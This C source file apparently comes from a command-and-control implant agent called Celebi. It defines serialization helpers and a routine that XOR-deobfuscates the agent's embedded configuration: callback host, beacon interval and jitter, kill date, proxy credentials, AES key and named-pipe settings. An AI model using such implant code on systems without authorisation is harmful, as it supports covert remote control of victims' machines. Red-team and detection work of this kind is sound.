#include <windows.h>
#include "headers/celebi.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);

/*
 *
 * PACK
 *
*/

void pack_char(char *buf, int *offset, char paydata) {
	buf[*offset] = paydata;
	*offset += 1;
}

void pack_uint(char *buf, int *offset, unsigned int paydata) {
	for (int i = 0; i < sizeof(unsigned int); i++) {
		buf[*offset] = ((char *) &paydata)[i];
		*offset += 1;
	}
}

void pack_string(char *buf, int *offset, char *paydata) {
	if (paydata != NULL) {
		int len = MSVCRT$strlen(paydata);
		for (int i = 0; i < len; i++) {
			buf[*offset] = paydata[i];
			*offset += 1;
		}
	}
	
	// Add the null byte. If paydata is NULL, this results in a zero-length string.
	buf[*offset] = 0;
	*offset += 1;
}

/*
 *
 * UNPACK
 *
*/

char unpack_char(char *buf, int *offset) {
	// Unpacks a single byte at the current offset.
	// The offset parameter is updated to the new position.
	
	char byte = buf[*offset];
	*offset += 1;
	return byte;
}

int unpack_int(char *buf, int *offset) {
	// Unpacks an integer at the current offset.
	// The offset parameter is updated to the end of the integer.
	
	int *int_ptr = (int *) &(buf[*offset]);
	*offset += sizeof(int);
	return *int_ptr;
}

unsigned int unpack_uint(char *buf, int *offset) {
	// Unpacks an unsigned integer at the current offset.
	// The offset parameter is updated to the end of the integer.
	
	unsigned int *int_ptr = (unsigned int *) &(buf[*offset]);
	*offset += sizeof(unsigned int);
	return *int_ptr;
}

char *unpack_str(char *buf, int *offset) {
	// Unpacks a string at the current offset by calculating its length and copying it over.
	// The offset parameter is updated to the end of the string.
	
	char *str_ptr = &(buf[*offset]);
	int str_len = MSVCRT$strlen(str_ptr);
	
	char *unpacked_str = KERNEL32$VirtualAlloc(0, str_len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0; i < str_len; i++) {
		unpacked_str[i] = str_ptr[i];
	}
	unpacked_str[str_len] = '\0';
	
	*offset += str_len + 1;
	return unpacked_str;
}

/*
 *
 * PARAMS
 *
*/

void unpack_params(char *enc_params, char *key, int keylen, AgentParams *params) {
	// Takes the packed strings patched in by the linker, deobfuscates them, and unpacks it into an AgentParams struct.
	char *raw_params = KERNEL32$VirtualAlloc(0, PARAM_BUFFER_LEN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	xorify(raw_params, enc_params, PARAM_BUFFER_LEN, key, keylen);
	
	int offset = 0;
	
	params->payload_uuid = unpack_str(raw_params, &offset);
	params->callback_host = unpack_str(raw_params, &offset);
	params->callback_port = unpack_int(raw_params, &offset);
	params->callback_https = unpack_int(raw_params, &offset);
	params->callback_uri = unpack_str(raw_params, &offset);
	params->get_uri = unpack_str(raw_params, &offset);
	params->query_path_name = unpack_str(raw_params, &offset);
	params->callback_interval = unpack_int(raw_params, &offset);
	params->callback_jitter = unpack_int(raw_params, &offset);
	params->killdate = unpack_str(raw_params, &offset);
	params->headers = unpack_str(raw_params, &offset);
	params->proxy_host = unpack_str(raw_params, &offset);
	params->proxy_port = unpack_int(raw_params, &offset);
	params->proxy_user = unpack_str(raw_params, &offset);
	params->proxy_pass = unpack_str(raw_params, &offset);
	params->aes_value = unpack_str(raw_params, &offset);
	params->aes_key = unpack_str(raw_params, &offset);
	params->encrypted_exchange_check = unpack_str(raw_params, &offset);
	params->pipename = unpack_str(raw_params, &offset);
	params->p2p_profile = unpack_str(raw_params, &offset);
	params->p2p_port = unpack_int(raw_params, &offset);
	
	KERNEL32$VirtualFree(raw_params, 0, MEM_RELEASE);
}

void free_params(AgentParams *params) {
	if (params->payload_uuid != NULL) { KERNEL32$VirtualFree(params->payload_uuid, 0, MEM_RELEASE); }
	if (params->callback_host != NULL) { KERNEL32$VirtualFree(params->callback_host, 0, MEM_RELEASE); }
	if (params->callback_uri != NULL) { KERNEL32$VirtualFree(params->callback_uri, 0, MEM_RELEASE); }
	if (params->get_uri != NULL) { KERNEL32$VirtualFree(params->get_uri, 0, MEM_RELEASE); }
	if (params->query_path_name != NULL) { KERNEL32$VirtualFree(params->query_path_name, 0, MEM_RELEASE); }
	if (params->killdate != NULL) { KERNEL32$VirtualFree(params->killdate, 0, MEM_RELEASE); }
	if (params->headers != NULL) { KERNEL32$VirtualFree(params->headers, 0, MEM_RELEASE); }
	if (params->proxy_host != NULL) { KERNEL32$VirtualFree(params->proxy_host, 0, MEM_RELEASE); }
	if (params->proxy_user != NULL) { KERNEL32$VirtualFree(params->proxy_user, 0, MEM_RELEASE); }
	if (params->proxy_pass != NULL) { KERNEL32$VirtualFree(params->proxy_pass, 0, MEM_RELEASE); }
	if (params->aes_value != NULL) { KERNEL32$VirtualFree(params->aes_value, 0, MEM_RELEASE); }
	if (params->aes_key != NULL) { KERNEL32$VirtualFree(params->aes_key, 0, MEM_RELEASE); }
	if (params->encrypted_exchange_check != NULL) { KERNEL32$VirtualFree(params->encrypted_exchange_check, 0, MEM_RELEASE); }
	if (params->pipename != NULL) { KERNEL32$VirtualFree(params->pipename, 0, MEM_RELEASE); }
	if (params->p2p_profile != NULL) { KERNEL32$VirtualFree(params->p2p_profile, 0, MEM_RELEASE); }
}
